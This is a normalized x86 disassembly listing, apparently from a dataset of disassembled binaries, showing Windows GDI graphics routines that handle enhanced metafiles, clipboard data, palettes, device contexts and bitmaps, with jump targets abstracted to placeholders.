mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_428959
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_408870
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c868
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404388
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_426f7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428960
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_4289b4
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_428c08
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
push esp
push 0x64
push esi
call GetEnhMetaFileHeader
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423a18
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] esi
xor edx edx
mov [ eax + 0x1c ] edx
xor edx edx
mov [ eax + 0x20 ] edx
test esi esi
je r-xdata
push eax
call DeleteEnhMetaFile
call sub_425a28
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esp 0x64
pop esi
pop ebx
retn
mov edx [ esp + 0x20 ]
sub edx [ esp + 0x18 ]
mov [ eax + 0xc ] edx
mov edx [ esp + 0x24 ]
sub edx [ esp + 0x1c ]
mov [ eax + 0x10 ] edx
sub_428a44
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4285f0
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_428ab8
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_428ab8
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_428ab8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_4285f0
pop esi
pop ebx
retn
mov eax ebx
call sub_428c08
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428af4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_4285f0
pop esi
pop ebx
retn
mov eax ebx
call sub_428c08
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428b34
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4285f0
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_428af4
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_428af4
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_428ba8
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41b39c
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_428c08
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_4285f0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_429370
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_42936c
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_428c8c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41b39c
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_428d98
mov edx ebx
mov eax esi
call sub_428d0c
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_428d0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40276c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428d88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41b600
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40278c
retn
sub_428d98
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402bf8
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41b600
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41b600
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428eba
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40278c
retn
call sub_425a88
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_426878
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_428ed3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_40276c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428eb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_428ee0
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_4285f0
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_4259f8
sub_428f64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_429050
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_419188
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4290ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4290f5
mov eax [ rw-data ]
call sub_4191ec
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4290c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4291e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425630
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418dc4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4255d4
test al al
je r-xdata
sub_4290fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_419188
mov esi eax
xor ecx ecx
push ebp
push sub_42916c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4191ec
retn
mov edx ebx
mov eax esi
call sub_418dc4
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4291e0
sub_429178
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4250c4
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4291b4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_4291e0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_425188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4291e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42538c
xor edx edx
push ebp
push sub_429274
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4257b8
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41919c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425630
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_429280
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42538c
xor eax eax
push ebp
push sub_42935f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42a59c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4290fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42a69c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4257b8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_419100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425630
retn
sub_429370
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_4031ec
sub_429390
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4290fc
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d538
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4293ec
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_423a18
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4290fc
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4290fc
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_429438
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_4262c4
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4294e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4294f4
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_429540
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4290fc
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_425b30
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425b30
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_429b8e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_40276c
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_429898
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_425a10
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_425b30
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_425b30
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_425b30
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_425b30
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_429b3f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_429b2e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_429b0c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_425b30
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_4294f4
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_402968
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_4262c4
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424fa8
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_41776c
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4242e8
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424f6c
call sub_4242e8
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_425a88
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429b13
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425b30
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_429ae2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425b30
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_40278c
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4242e8
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
